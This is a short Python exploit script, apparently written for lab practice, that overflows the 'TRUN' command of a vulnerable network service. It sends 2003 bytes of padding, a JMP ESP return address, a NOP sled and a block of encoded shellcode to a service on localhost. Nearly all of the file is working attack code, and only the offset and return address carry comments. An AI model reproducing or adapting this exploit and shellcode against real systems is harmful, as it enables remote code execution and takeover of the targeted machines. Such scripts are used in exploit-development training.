
import socket,struct

buff = "A" * 2003

#jump esp address 0x625011AF
#offset 2003
 
jump=struct.pack("I", 0x625011AF)

nop = "\x90" * 20

shellcode = ("\xdb\xcd\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53\xbb\x44\xdc\x09"
        "\x7b\x31\x5a\x17\x83\xc2\x04\x03\x1e\xcf\xeb\x8e\x62\x07\x69"
        "\x70\x9a\xd8\x0e\xf8\x7f\xe9\x0e\x9e\xf4\x5a\xbf\xd4\x58\x57"
        "\x34\xb8\x48\xec\x38\x15\x7f\x45\xf6\x43\x4e\x56\xab\xb0\xd1"
        "\xd4\xb6\xe4\x31\xe4\x78\xf9\x30\x21\x64\xf0\x60\xfa\xe2\xa7"
        "\x94\x8f\xbf\x7b\x1f\xc3\x2e\xfc\xfc\x94\x51\x2d\x53\xae\x0b"
        "\xed\x52\x63\x20\xa4\x4c\x60\x0d\x7e\xe7\x52\xf9\x81\x21\xab"
        "\x02\x2d\x0c\x03\xf1\x2f\x49\xa4\xea\x45\xa3\xd6\x97\x5d\x70"
        "\xa4\x43\xeb\x62\x0e\x07\x4b\x4e\xae\xc4\x0a\x05\xbc\xa1\x59"
        "\x41\xa1\x34\x8d\xfa\xdd\xbd\x30\x2c\x54\x85\x16\xe8\x3c\x5d"
        "\x36\xa9\x98\x30\x47\xa9\x42\xec\xed\xa2\x6f\xf9\x9f\xe9\xe7"
        "\xce\xad\x11\xf8\x58\xa5\x62\xca\xc7\x1d\xec\x66\x8f\xbb\xeb"
        "\x89\xba\x7c\x63\x74\x45\x7d\xaa\xb3\x11\x2d\xc4\x12\x1a\xa6"
        "\x14\x9a\xcf\x53\x1c\x3d\xa0\x41\xe1\xfd\x10\xc6\x49\x96\x7a"
        "\xc9\xb6\x86\x84\x03\xdf\x2f\x79\xac\xce\xf3\xf4\x4a\x9a\x1b"
        "\x51\xc4\x32\xde\x86\xdd\xa5\x21\xed\x75\x41\x69\xe7\x42\x6e"
        "\x6a\x2d\xe5\xf8\xe1\x22\x31\x19\xf6\x6e\x11\x4e\x61\xe4\xf0"
        "\x3d\x13\xf9\xd8\xd5\xb0\x68\x87\x25\xbe\x90\x10\x72\x97\x67"
        "\x69\x16\x05\xd1\xc3\x04\xd4\x87\x2c\x8c\x03\x74\xb2\x0d\xc1"
        "\xc0\x90\x1d\x1f\xc8\x9c\x49\xcf\x9f\x4a\x27\xa9\x49\x3d\x91"
        "\x63\x25\x97\x75\xf5\x05\x28\x03\xfa\x43\xde\xeb\x4b\x3a\xa7"
        "\x14\x63\xaa\x2f\x6d\x99\x4a\xcf\xa4\x19\x6a\x32\x6c\x54\x03"
        "\xeb\xe5\xd5\x4e\x0c\xd0\x1a\x77\x8f\xd0\xe2\x8c\x8f\x91\xe7"
        "\xc9\x17\x4a\x9a\x42\xf2\x6c\x09\x62\xd7")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1',40901))

buff+=jump
buff+=nop
buff+=shellcode
s.send('TRUN /.:/' + buff)
